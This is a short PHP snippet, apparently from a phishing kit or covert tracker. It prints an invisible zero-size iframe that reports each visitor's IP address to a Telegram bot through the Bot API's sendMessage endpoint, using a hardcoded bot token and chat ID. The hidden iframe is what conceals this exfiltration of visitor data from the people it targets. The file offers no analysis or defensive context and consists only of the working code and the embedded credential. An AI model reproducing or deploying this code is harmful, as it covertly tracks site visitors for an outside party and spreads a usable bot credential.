<?php 
$message="ip detected";
print '<iframe width="0" height="0" src="https://api.telegram.org/bot301147721:AAFizhCHrY0aHpyCCGUE3a2yQSgr_aQHfcI/sendMessage?chat_id=-1001100970990&text='.$_SERVER['REMOTE_ADDR'].' - '.$message.'" frameborder="0" allowfullscreen></iframe>';
?>
